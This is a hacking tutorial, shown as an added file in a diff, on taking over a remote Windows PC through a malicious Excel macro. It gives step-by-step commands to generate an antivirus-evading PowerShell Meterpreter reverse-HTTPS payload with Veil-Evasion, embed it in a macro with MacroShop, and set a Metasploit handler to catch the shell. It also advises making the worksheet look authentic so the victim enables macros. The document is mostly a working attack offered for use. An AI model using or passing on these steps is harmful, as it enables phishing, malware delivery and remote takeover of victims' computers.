@@ -1,0 +1,55 @@
+
+Hack Remote PC  using Microsoft Office Files (Macro Payloads)
+
+Veil-Evasion is a powerful tool to generate payload executables that bypass common antivirus solutions.
+To install veil-evasion on your kali linux, type :
+apt-get install veil-evasion
+ After the installation completes, run veil-evasion with the following command on terminal, in the installed directory of veil-evasion:
+veil-evasion
+
+To see the options of payloads type
+list
+We can see a menu of the available payloads to use. There are plenty of payloads to use.
+
+We will be using the payload id-23. We type the command:
+>use powershell/meterpreter/rev_https
+Reverse https is used here just so in case if the victim’s PC has a firewall enabled for TCP, considering the most common situations where HTTPS is not blocked on PC.
+After that set local host(Your PC’s IP). In my case it is 192.168.0.105. Hence:
+>set lhost  192.168.0.105
+And then generate the payload:
+generate
+
+Enter the name of file. Let the name of file to be generated be raj. Therefore;
+raj
+
+Now, the Veil-Evasion tool has created a bat file in powershell code in the directory:
+/var/lib/veil-evasion/output/source/raj.bat
+
+Open a new window of terminal and install MacroShop. MacroShop is a collection of scripts to aid in delivering payloads via Office Macros. Most are Python. To install it we type:
+git clone https://github.com/khr0x40sh/MacroShop.git
+
+After the installation of MacroShop, open its installed folder and place the file “raj.bat” in that directory.
+
+Once the file “raj.bat” is placed in MacroShop, change the terminal path to MacroShop(or right click on the installed directory and click open in terminal and type:
+python macro_safe.py raj.bat file.txt
+Here file.txt is the name of output text file that MacroShop will create.
+
+Now open windows->New Microsoft  Office Excel Worksheet->view(on the top bar)->macro
+Enter the macro name->create
+
+Then in the Macro editing area(or the workbook) copy paste the code present in “file.txt” to the workbook and save macro.
+
+Now, edit the Microsoft excel worksheet so as to make it look authentic and edit it in such a way that the victim should definitely enable Macro option( given it is disabled).
+Just for the case of simplicity and tutorial, I enter something random and save it as Microsoft Excel document 97-2003.
+
+Open the excel document again, and enable macro option(if disabled).
+
+Meanwhile, open metasploit on kali linux
+msf>use exploit/multi/handler
+msf exploit(handler)>set payload windows/meterpreter/reverse_https
+msf exploit(handler)>set lhost 192.168.0.105
+msf exploit(handler)>set lport 8443
+msf exploit(handler)>exploit
+ As soon as victim clicks on enabling the macro and/or opens the excel document, Voila! We get the meterpreter session. Hence, job is done.
+
+Author: Harshit Rajpal is an InfoSec researcher and has a keen interest in technology. contact here
